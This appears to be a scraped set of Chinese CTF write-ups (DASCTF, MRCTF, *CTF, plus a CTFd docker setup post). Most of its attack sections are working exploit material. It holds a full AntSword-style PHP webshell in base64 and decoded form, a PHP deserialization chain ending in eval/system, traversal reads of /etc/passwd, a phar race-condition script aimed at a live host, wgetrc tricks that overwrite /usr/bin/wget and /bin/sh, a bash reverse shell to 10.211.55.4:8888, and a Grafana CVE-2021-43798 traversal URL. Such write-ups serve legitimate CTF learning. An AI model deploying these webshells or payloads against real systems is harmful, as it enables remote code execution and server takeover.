JldHVybiBGYWxzZTt9O2Z1bmN0aW9uIHJ1bmNtZCgkYyl7JHJldD0wOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZihmZSgnc3lzdGVtJykpe0BzeXN0ZW0oJGMsJHJldCk7fWVsc2VpZihmZSgncGFzc3RocnUnKSl7QHBhc3N0aHJ1KCRjLCRyZXQpO31lbHNlaWYoZmUoJ3NoZWxsX2V4ZWMnKSl7cHJpbnQoQHNoZWxsX2V4ZWMoJGMpKTt9ZWxzZWlmKGZlKCdleGVjJykpe0BleGVjKCRjLCRvLCRyZXQpO3ByaW50KGpvaW4oIgoiLCRvKSk7fWVsc2VpZihmZSgncG9wZW4nKSl7JGZwPUBwb3BlbigkYywncicpO3doaWxlKCFAZmVvZigkZnApKXtwcmludChAZmdldHMoJGZwLDIwNDgpKTt9QHBjbG9zZSgkZnApO31lbHNlaWYoZmUoJ3Byb2Nfb3BlbicpKXskcCA9IEBwcm9jX29wZW4oJGMsIGFycmF5KDEgPT4gYXJyYXkoJ3BpcGUnLCAndycpLCAyID0+IGFycmF5KCdwaXBlJywgJ3cnKSksICRpbyk7d2hpbGUoIUBmZW9mKCRpb1sxXSkpe3ByaW50KEBmZ2V0cygkaW9bMV0sMjA0OCkpO313aGlsZSghQGZlb2YoJGlvWzJdKSl7cHJpbnQoQGZnZXRzKCRpb1syXSwyMDQ4KSk7fUBmY2xvc2UoJGlvWzFdKTtAZmNsb3NlKCRpb1syXSk7QHByb2NfY2xvc2UoJHApO31lbHNlaWYoZmUoJ2FudHN5c3RlbScpKXtAYW50c3lzdGVtKCRjKTt9ZWxzZWlmKHJ1bnNoZWxsc2hvY2soJGQsICRjKSkge3JldHVybiAkcmV0O31lbHNlaWYoc3Vic3RyKCRkLDAsMSkhPSIvIiAmJiBAY2xhc3NfZXhpc3RzKCJDT00iKSl7JHc9bmV3IENPTSgnV1NjcmlwdC5zaGVsbCcpOyRlPSR3LT5leGVjKCRjKTskc289JGUtPlN0ZE91dCgpOyRyZXQuPSRzby0+UmVhZEFsbCgpOyRzZT0kZS0+U3RkRXJyKCk7JHJldC49JHNlLT5SZWFkQWxsKCk7cHJpbnQoJHJldCk7fWVsc2V7JHJldCA9IDEyNzt9cmV0dXJuICRyZXQ7fTskcmV0PUBydW5jbWQoJHIuIiAyPiYxIik7cHJpbnQgKCRyZXQhPTApPyJyZXQ9eyRyZXR9IjoiIjs7fWNhdGNoKEV4Y2VwdGlvbiAkZSl7ZWNobyAiRVJST1I6Ly8iLiRlLT5nZXRNZXNzYWdlKCk7fTthc291dHB1dCgpO2RpZSgpOw== \u0026amp;o1faebd4ec3d97=WaL2Jpbi9zaA==   这个很长的解开是就是加密的木马\n1 2  \u0026lt;?php @ini_set(\u0026#34;display_errors\u0026#34;, \u0026#34;0\u0026#34;);@set_time_limit(0);function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo \u0026#34;b63ba\u0026#34;.\u0026#34;7dfa20\u0026#34;;echo @asenc($output);echo \u0026#34;80e\u0026#34;.\u0026#34;11a\u0026#34;;}ob_start();try{$p=base64_decode(substr($_POST[\u0026#34;o1faebd4ec3d97\u0026#34;],2));$s=base64_decode(substr($_POST[\u0026#34;g479cf6f058cf8\u0026#34;],2));$envstr=@base64_decode(substr($_POST[\u0026#34;e57fb9c067c677\u0026#34;],2));$d=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);$c=substr($d,0,1)==\u0026#34;/\u0026#34;?\u0026#34;-c \\\u0026#34;{$s}\\\u0026#34;\u0026#34;:\u0026#34;/c \\\u0026#34;{$s}\\\u0026#34;\u0026#34;;if(substr($d,0,1)==\u0026#34;/\u0026#34;){@putenv(\u0026#34;PATH=\u0026#34;.getenv(\u0026#34;PATH\u0026#34;).\u0026#34;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;);}else{@putenv(\u0026#34;PATH=\u0026#34;.getenv(\u0026#34;PATH\u0026#34;).\u0026#34;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;\u0026#34;);}if(!empty($envstr)){$envarr=explode(\u0026#34;|||asline|||\u0026#34;, $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace(\u0026#34;|||askey|||\u0026#34;, \u0026#34;=\u0026#34;, $v));}}}$r=\u0026#34;{$p}{$c}\u0026#34;;function fe($f){$d=explode(\u0026#34;,\u0026#34;,@ini_get(\u0026#34;disable_functions\u0026#34;));if(empty($d)){$d=array();}else{$d=array_map(\u0026#39;trim\u0026#39;,array_map(\u0026#39;strtolower\u0026#39;,$d));}return(function_exists($f)\u0026amp;\u0026amp;is_callable($f)\u0026amp;\u0026amp;!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == \u0026#34;/\u0026#34; \u0026amp;\u0026amp; fe(\u0026#39;putenv\u0026#39;) \u0026amp;\u0026amp; (fe(\u0026#39;error_log\u0026#39;) || fe(\u0026#39;mail\u0026#39;))) {if (strstr(readlink(\u0026#34;/bin/sh\u0026#34;), \u0026#34;bash\u0026#34;) != FALSE) {$tmp = tempnam(sys_get_temp_dir(), \u0026#39;as\u0026#39;);putenv(\u0026#34;PHP_LOL=() { x; }; $c\u0026gt;$tmp2\u0026gt;\u0026amp;1\u0026#34;);if (fe(\u0026#39;error_log\u0026#39;)) {error_log(\u0026#34;a\u0026#34;, 1);} else {mail(\u0026#34;a@127.0.0.1\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;-bv\u0026#34;);}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != \u0026#34;\u0026#34;) {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER[\u0026#34;SCRIPT_FILENAME\u0026#34;]);if(fe(\u0026#39;system\u0026#39;)){@system($c,$ret);}elseif(fe(\u0026#39;passthru\u0026#39;)){@passthru($c,$ret);}elseif(fe(\u0026#39;shell_exec\u0026#39;)){print(@shell_exec($c));}elseif(fe(\u0026#39;exec\u0026#39;)){@exec($c,$o,$ret);print(join(\u0026#34; \u0026#34;,$o));}elseif(fe(\u0026#39;popen\u0026#39;)){$fp=@popen($c,\u0026#39;r\u0026#39;);while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe(\u0026#39;proc_open\u0026#39;)){$p = @proc_open($c, array(1 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;), 2 =\u0026gt; array(\u0026#39;pipe\u0026#39;, \u0026#39;w\u0026#39;)), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe(\u0026#39;antsystem\u0026#39;)){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!=\u0026#34;/\u0026#34; \u0026amp;\u0026amp; @class_exists(\u0026#34;COM\u0026#34;)){$w=new COM(\u0026#39;WScript.shell\u0026#39;);$e=$w-\u0026gt;exec($c);$so=$e-\u0026gt;StdOut();$ret.=$so-\u0026gt;ReadAll();$se=$e-\u0026gt;StdErr();$ret.=$se-\u0026gt;ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r.\u0026#34; 2\u0026gt;\u0026amp;1\u0026#34;);print ($ret!=0)?\u0026#34;ret={$ret}\u0026#34;:\u0026#34;\u0026#34;;;}catch(Exception $e){echo \u0026#34;ERROR://\u0026#34;.$e-\u0026gt;getMessage();};asoutput();die();   这里进行一个审计，发现执行的命令是$c，所以我们在后面加一个echo弄出来就可以了\n成功拿到密码PaSsZiPWorD\n解开压缩包就是flag\nWeb warmup-php 在构造函数里面，会调用一个run方法\n1  $object-\u0026gt;run();   有run方法的只有listview\n1 2 3 4 5 6  public function run() { echo \u0026#34;\u0026lt;\u0026#34;.$this-\u0026gt;tagName.\u0026#34;\u0026gt;\\n\u0026#34;; $this-\u0026gt;renderContent(); echo \u0026#34;\u0026lt;\u0026#34;.$this-\u0026gt;tagName.\u0026#34;\u0026gt;\\n\u0026#34;; }   执行命令的地方在Base的evaluateExpression里面，这里最底层的类是TestView，所以我们从这里分析\n这里的renderTableRow方法里面会进入evaluateExpression，而renderTableRow可以从renderTableBody进入\n再回头来看run方法，调用run方法以后进入renderContent，这里会进入renderSection，这里会进行一拼接\n所以我们可以利用这个进入renderTableBody，这样利用链就出来了\n1  Action-\u0026gt;run()-\u0026gt;renderContent()-\u0026gt;renderSection()-\u0026gt;renderTableBody()-\u0026gt;renderTableRow()-\u0026gt;evaluateExpression()   那么就看看怎么传参，首先是action，是最底层的类TestView，然后看properties，这里会循环为对象属性赋值\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  highlight_file(__FILE__); error_reporting(0); $action = $_GET[\u0026#39;action\u0026#39;]; $properties = $_POST[\u0026#39;properties\u0026#39;]; class Action{ public function __construct($action,$properties){ $object=new $action(); foreach($properties as $name=\u0026gt;$value) $object-\u0026gt;$name=$value; $object-\u0026gt;run(); } } new Action($action,$properties);   我们进入TestView去看看，首先看执行的命令，是rowHtmlOptionsExpression属性\n所以赋值为eval($_POST[1])，还需要有一个参数data，这个并不影响，所以我们可以随便附一个值\n再往回走到ListView里面，这里是执行了一个无参的方法，我们前面分析的是从renderTableBody进去renderTableRow，所以这里我们需要以数组的形式拼接一个TableBody\n那么传参为properties[template]={TableBody}\n最后的payload\nget\n1  ?action=TestView   post\n1  1=system(\u0026#39;whoami\u0026#39;);\u0026amp;properties[data]=ph\u0026amp;properties[rowHtmlOptionsExpression]=eval($_POST[1])\u0026amp;properties[template]={TableBody}   在/readflag拿到flag\nsoeasy_php 发现有个editor.php\n使用下面的payload可以任意文件读取\n1  png=../../../../../../etc/passwd\u0026amp;flag=1   读一下源码\nupload.php\n1 2 3 4 5 6 7 8 9 10 11  \u0026lt;?php if (!isset($_FILES[\u0026#39;file\u0026#39;])) { die(\u0026#34;请上传头像\u0026#34;); } $file = $_FILES[\u0026#39;file\u0026#39;]; $filename = md5(\u0026#34;png\u0026#34;.$file[\u0026#39;name\u0026#39;]).\u0026#34;.png\u0026#34;; $path = \u0026#34;uploads/\u0026#34;.$filename; if(move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;],$path)){ echo \u0026#34;上传成功： \u0026#34;.$path; };   editor.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  \u0026lt;?php class flag{ public function copyflag(){ exec(\u0026#34;/copyflag\u0026#34;); //以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt  echo \u0026#34;SFTQL\u0026#34;; } public function __destruct(){ $this-\u0026gt;copyflag(); } } function filewrite($file,$data){ unlink($file); file_put_contents($file, $data); } if(isset($_POST[\u0026#39;png\u0026#39;])){ $filename = $_POST[\u0026#39;png\u0026#39;]; if(!preg_match(\u0026#34;/:|phar|\\/\\/|php/im\u0026#34;,$filename)){ $f = fopen($filename,\u0026#34;r\u0026#34;); $contents = fread($f, filesize($filename)); if(strpos($contents,\u0026#34;flag{\u0026#34;) !== false){ filewrite($filename,\u0026#34;Don\u0026#39;t give me flag!!!\u0026#34;); } } if(isset($_POST[\u0026#39;flag\u0026#39;])) { $flag = (string)$_POST[\u0026#39;flag\u0026#39;]; if ($flag == \u0026#34;Give me flag\u0026#34;) { filewrite(\u0026#34;/tmp/flag.txt\u0026#34;, \u0026#34;Don\u0026#39;t give me flag\u0026#34;); sleep(2); die(\u0026#34;no no no !\u0026#34;); } else { filewrite(\u0026#34;/tmp/flag.txt\u0026#34;, $flag); //不给我看我自己写个flag。  } $head = \u0026#34;uploads/head.png\u0026#34;; unlink($head); if (symlink($filename, $head)) { echo \u0026#34;成功更换头像\u0026#34;; } else { unlink($filename); echo \u0026#34;非正常文件，已被删除\u0026#34;; }; } }   发现新大陆，这里大概的逻辑是这样，有一个类flag，在下面是把post[png]的值创建一个软链到uploads/head.png，这里用了unlink，又有class，而且涉及到文件操作，基本锁定是phar反序列化了，而unlink可以触发phar反序列化\n这里的flag类里面执行了这样的文件\n 以root权限复制/flag 到 /tmp/flag.txt\n 但是这里会把post[flag]写进/tmp/flag.txt，这里就有矛盾了\n如果我们要读文件/tmp/flag.txt，那么就得再次触发这个，那么就会把post[flag]写进/tmp/flag\n这样我们之前写的flag就没了，那么这里就是需要一个竞争了\n还有一个难点，我们得触发phar反序列化，而触发点在这\n要进这个点，那么就只能让symlink报错才行，一开始尝试加个%00，虽然成功报错，但是无法反序列化了，这里是需添加脏数据来报错\n那么就开始构造payload：\nphar文件构造\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  \u0026lt;?php class flag{ public function copyflag(){ exec(\u0026#34;/copyflag\u0026#34;); //以root权限复制/flag 到 /tmp/flag.txt，并chown www-data:www-data /tmp/flag.txt echo \u0026#34;SFTQL\u0026#34;; } public function __destruct(){ $this-\u0026gt;copyflag(); } } $a = new flag(); @unlink(\u0026#34;phar.phar\u0026#34;); $phar = new Phar(\u0026#34;phar.phar\u0026#34;); $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); $phar-\u0026gt;setMetadata($a); $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); $phar-\u0026gt;stopBuffering();   上传拿到路径uploads/fe409167fb98b72dcaff5486a612a575.png\n尝试添加脏数据，成功反序列化\n那么就可以开始条件竞争了\n phar反序列化的触发 软链指向uploads/head.png 访问uploads/head.png拿到信息  编写如下脚本\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  import requests import threading import time url = \u0026#34;http://94b52e33-8f81-4589-899f-482f234c6cac.node4.buuoj.cn:81\u0026#34; png = \u0026#34;/uploads/head.png\u0026#34; flag = \u0026#34;../../../../../../tmp/flag.txt\u0026#34; phar = \u0026#34;\u0026#34;\u0026#34;phar://../../../../../../var/www/html/uploads/fe409167fb98b72dcaff5486a612a575.png/test.txtaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026#34;\u0026#34;\u0026#34; def getpng(): res = requests.get(url+png) print(res.text) def linkflag(): data = { \u0026#34;flag\u0026#34;:\u0026#34;1\u0026#34;, \u0026#34;png\u0026#34;:flag } res = requests.post(url=url+\u0026#34;/edit.php\u0026#34;,data=data) print(res.text) def putphar(): data = { \u0026#34;flag\u0026#34;:\u0026#34;1\u0026#34;, \u0026#34;png\u0026#34;:phar } res = requests.post(url=url+\u0026#34;/edit.php\u0026#34;,data=data) print(res.text) while True: for i in range(10): t3 = threading.Thread(target=putphar) t3.start() t2 = threading.Thread(target=linkflag) t2.start() t1 = threading.Thread(target=getpng) t1.start() time.sleep(5)   ","date":"2022-04-25T18:12:37+08:00","permalink":"https://example.com/post/2022dasctf%E5%9B%9B%E6%9C%88%E8%B5%9B_wp/","title":"[2022DASCTF Apr X FATE 防疫挑战赛] WP"},{"content":"Misc checkin 翻源码找到flag\nWeb WebCheckIn 上传东西上去发现没有回显，然后试着传其他的文件上去，发现随手写的php文件上传上去了，返回了路径\n然后就往里面加了一句话木马进去了\n然后发现根目录没有flag\n而且只是www权限，猜测是不是要提权，看了一下php文件的权限就是root\n于是直接用php文件反弹shell，直接反弹shell不行，会报错，这里用的curl反弹shell\n进去直接find搜flag，成功拿到\nBonus Java_mem_shell_Basic 打开是tomcat的默认页面，进入manage看看，弱口令tomcat:tomcat登录成功，进了manage就可以随便getshell了\n这里把冰蝎马打包一个war包，然后传上去拿到shell\n1  jar cvf hmnb.war shellmh.jsp   然后连进冰蝎，而且给的直接就是root权限\n感觉冰蝎的终端不好用，反弹一个shell\n直接find查找到flag\nJava_mem_shell_Filter 进入是一个登录页面\n目录扫描没啥结果\n尝试爆破一个账号密码，爆破了一大堆，找不到可用的\n尝试sql注入，试了很多，根本试不出报错，尝试跑一下sqlmap，还是无果\n后来发现是log4j。。。\n马上来打一波\n进去以后，发现web目录有一个godzilla，密码拿到了，密钥是默认的key\n连进哥斯拉里面\nfind没找到flag，结合题目名理解，可能是在filter内存马里面，这里用jmapdump出jvm内存\n首先查看pid： ps -ef|grep java\n然后dump：jmap -dump:format=b,file=e.bin 51\n然后下载出来\n找到flag\n","date":"2022-04-25T18:01:47+08:00","permalink":"https://example.com/post/mrctf2022_wp/","title":"[MRCTF2022] WP"},{"content":"New 相对于oh_my_lotto，revenge进行了下面的更改\n这么做，我们能走的就只有RCE了，而这里唯一能操作的一个地方就是这里，可以操作环境变量\n1  os.environ[lotto_key] = lotto_value   这里有几个非预期解，先看看预期解\nIntented writeup 这里可以操控环境变量，那么我们能做的事情就很多了，预期解是操控HOSTALIASES修改hosts\n因为他的wget是通过域名下载的\n1  os.system(\u0026#39;wget --content-disposition -N lotto\u0026#39;)   我们把伪造的hosts文件通过forecast路由传到服务器，然后修改环境变量把hosts指向/app/guess/forecast.txt\n剩下的就是如何利用了，可以发现wget的参数是--content-disposition -N\n对于这个参数的意义，我在谷歌找到了如下定义：他是可以由服务器端决定下载的文件，-N表示文件名不变进行覆盖\n、\n这样的话，我们就可以操控他下载的文件，去进行覆盖app.py\n我查找了这个http头的语法\n我们只需要在http头指定app.py即可把恶意的app.py覆盖掉源文件\n这样的话我们就可以编写如下poc\napp.py\n1 2 3 4 5 6 7 8 9 10  import flask import os app = flask.Flask(__name__) @app.route(\u0026#34;/rce\u0026#34;) def rce(): return str(os.popen(\u0026#39;env\u0026#39;).read()) if __name__ == \u0026#34;__main__\u0026#34;: app.run(debug=True,host=\u0026#39;0.0.0.0\u0026#39;, port=8080)   main.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import flask import os app = flask.Flask(__name__) @app.route(\u0026#34;/\u0026#34;) def index(): with open(\u0026#39;app.py\u0026#39;,\u0026#39;rb\u0026#39;) as f: res = f.read() r = flask.make_response(res) response.headers[\u0026#39;Content-Type\u0026#39;] = \u0026#39;text/plain\u0026#39; response.headers[\u0026#39;Content-Disposition\u0026#39;] = \u0026#39;attachment; filename=app.py\u0026#39; return response if __name__ == \u0026#34;__main__\u0026#34;: app.run(debug=True,host=\u0026#39;0.0.0.0\u0026#39;, port=8899)   在服务器启动main.py，然后上传伪造hosts文件\n1 2  # hosts lotto domain   然后在lotto页面修改环境变量\n1 2  HOSTALIASES /app/guess/forecast.txt   然后在服务器添加反代，把8899端口转发到80端口\n可以发现app.py成功被覆盖\n但是发现他还是原来的服务\n是因为服务是gunicorn搭建起来的，他更新py文件以后不会实时更新，而gunicorn有一个pre-forked worker机制，当某个worker超时以后，就会让gunicorn重启该worker\n我们可以抓包进行爆破服务让他崩溃重启\n崩溃后，成功拿到flag\n预期解至此\nUnintented writeup 非预期解，这里我只知道一直就是利用WGETRC，配合http_proxy和output_document，覆盖本地的wget应用，然后利用wget完成RCE\n查官方文档可知，wget会找环境变量WGETRC，加载wgetrc文件\n而具体利用wgetrc就是看这篇官方文档\n这样的话，就是通过上传我们构造的wgetrc去进行攻击\n这里注意了这几个配置项\n1 2 3 4 5 6 7  # 把记录写到file里 output_document = file Set the output filename—the same as ‘-O file’. # 设置HTTP代理 http_proxy = string Use string as HTTP proxy, instead of the one specified in environment.   我在本机测试了一下，设置了http_proxy以后，wget下载的都是代理服务器的文件\n通过这个代理服务器，我们可以通过修改代理服务器的东西去修改返回值，然后利用output_document进行覆盖\n0x01 因为我们只能执行wget，所以我们直接索性覆盖wget\n构造如下wgetrc文件\n1 2 3  output_document = /usr/bin/wget http_proxy = test.huamang.xyz https_proxy = test.huamang.xyz   在代理服务器开一个80端口的web服务，写着反弹shell的命令\n1 2  #!/bin/bash bash -c \u0026#34;bash -i \u0026lt; /dev/tcp/10.211.55.4/8888 1\u0026lt;\u0026amp;0 2\u0026lt;\u0026amp;0\u0026#34;   把文件传上去，然后去lotto路由修改WGETRC的值为/app/guess/forecast.txt\n然后触发wget命令，拿到flag\n但是这个方法不够优雅，会覆盖掉wget，让其他选手没有体验感\n0x02 WGETRC还有一个参数\n1  use_askpass=/bin/xxx   通过这个参数可以直接执行二进制文件，但是wget下载的文件，是没有x权限的，无法执行\n所以我们可以通过覆盖掉/bin/sh后（题目使用的是/usr/bin/），再利用这个参数去执行他\n所以具体步骤是：\n首先上传如下文件，覆盖掉可以执行文件\n1 2 3  output_document = /bin/sh http_proxy = test.huamang.xyz https_proxy = test.huamang.xyz   然后上传use_askpass参数去执行命令\n1  use_askpass=/bin/sh   成功RCE\n","date":"2022-04-20T18:24:27+08:00","permalink":"https://example.com/post/ctf2022_oh-my-lotto-revenge/","title":"[*CTF2022] oh-my-lotto-revenge"},{"content":"前言 （使用github图床，请科学上网）\n搭建校赛平台，这里是发现有一个很好看的ctfd的主题pixo\n所以就想着来搭建这么一个平台，这次我打算使用docker来搭建，使用docker搭建有两条路可走\n docker pull ctfd/ctfd docker-compose up  第一种方法的尝试 首先我是打算直接使用docker pull的方式来搭建的，的确可以搭建，但是主页会有广告\n我想着怎么把他删掉，我把文件通过docker传回服务器\n1  docker cp xx:/opt/CTFd ./   然后下载到本机进行搜索，发现他存在于views.py文件里面\n我对这个文件进行了审计，发现他会在setup的时候把内容写进html内，但是这里就有问题了，我如果是pull下来的镜像，我运行的时候他就已经启动了views.py，所以我无法修改里面的广告信息。所以我无奈之下只能放弃这个方法，我开始尝试docker-compose来进行搭建\ndocker-compose 我从github下载到CTFd3.4.3版本的文件，我找到docker-compose.yml文件，修改了端口号一后，我就开始执行docker-compose up\n我观察dockerfile，这里会进行apt的更新和下载\n但是发现apt会下载的十分缓慢，等了很久很久都下不完，于是我选择进行换源，我dockerfile进行如下修改，增加如下命令执行\n1 2 3  RUN sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list RUN apt-get clean RUN apt-get update   我空了一段时间打开，发现apt已经处理好了，但是pip出问题了，他下载超时了。。\n所以我还得对pip进行换源，我又对dockerfile进行如下的修改，添加阿里云源\n1 2  RUN pip config set global.index-url http://mirrors.aliyun.com/pypi/simple RUN pip config set install.trusted-host mirrors.aliyun.com   看见pip已经把所有模块安装完毕，就当我以为快要成功的时候，发现这里又有报错，说我的80端口被占用，那我不可能因为一个docker就把80端口给让出来吧，所以我修改了docker-compose.yml文件，将Nginx的端口转发到其他的端口\n这下总算成功的搭建起来了\nEND 附上这次dockerfile和docker-compose.yml\ndockerfile\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  FROMpython:3.7-slim-busterWORKDIR/opt/CTFdRUN mkdir -p /opt/CTFd /var/log/CTFd /var/uploads# hadolint ignore=DL3008RUN sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.listRUN apt-get cleanRUN apt-get updateRUN pip config set global.index-url http://mirrors.aliyun.com/pypi/simpleRUN pip config set install.trusted-host mirrors.aliyun.comRUN apt-get update \\  \u0026amp;\u0026amp; apt-get install -y --no-install-recommends \\  build-essential \\  python3-dev \\  libffi-dev \\  libssl-dev \\  git \\  \u0026amp;\u0026amp; apt-get clean \\  \u0026amp;\u0026amp; rm -rf /var/lib/apt/lists/*COPY requirements.txt /opt/CTFd/RUN pip install -r requirements.txt --no-cache-dirCOPY . /opt/CTFd# hadolint ignore=SC2086RUN for d in CTFd/plugins/*; do \\  if [ -f \u0026#34;$d/requirements.txt\u0026#34; ]; then \\  pip install -r $d/requirements.txt --no-cache-dir; \\  fi; \\  done;RUN adduser \\  --disabled-login \\  -u 1001 \\  --gecos \u0026#34;\u0026#34; \\  --shell /bin/bash \\  ctfdRUN chmod +x /opt/CTFd/docker-entrypoint.sh \\  \u0026amp;\u0026amp; chown -R 1001:1001 /opt/CTFd /var/log/CTFd /var/uploadsUSER1001EXPOSE8000ENTRYPOINT [\u0026#34;/opt/CTFd/docker-entrypoint.sh\u0026#34;]  docker-compose.yml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65  version:\u0026#39;2\u0026#39;services:ctfd:build:.user:rootrestart:alwaysports:- \u0026#34;50010:8000\u0026#34;environment:- UPLOAD_FOLDER=/var/uploads- DATABASE_URL=mysql+pymysql://ctfd:ctfd@db/ctfd- REDIS_URL=redis://cache:6379- WORKERS=1- LOG_FOLDER=/var/log/CTFd- ACCESS_LOG=-- ERROR_LOG=-- REVERSE_PROXY=truevolumes:- .data/CTFd/logs:/var/log/CTFd- .data/CTFd/uploads:/var/uploads- .:/opt/CTFd:rodepends_on:- dbnetworks:default:internal:nginx:image:nginx:1.17restart:alwaysvolumes:- ./conf/nginx/http.conf:/etc/nginx/nginx.confports:- 50011:80depends_on:- ctfddb:image:mariadb:10.4.12restart:alwaysenvironment:- MYSQL_ROOT_PASSWORD=ctfd- MYSQL_USER=ctfd- MYSQL_PASSWORD=ctfd- MYSQL_DATABASE=ctfdvolumes:- .data/mysql:/var/lib/mysqlnetworks:internal:# This command is required to set important mariadb defaultscommand:[mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=28800, --log-warnings=0]cache:image:redis:4restart:alwaysvolumes:- .data/redis:/datanetworks:internal:networks:default:internal:internal:true  ","date":"2022-04-19T18:27:37+08:00","permalink":"https://example.com/post/%E6%A0%A1%E8%B5%9B%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/","title":"校赛CTFd平台docker搭建—pixo主题"},{"content":"Web oh-my-grafana 存在CVE-2021-43798 paylaod\n1  http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar/lib/grafana/grafana.db   有个加盐的密码 再找找其他配置文件，反正任意文件读取用起来 1  http://124.70.163.46:3000/public/plugins/alertGroups/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc/grafana/grafana.ini   拿到了密码 1 2 3 4 5  # default admin user, created on startup admin_user = admin # default admin password, can be changed before first start of grafana, 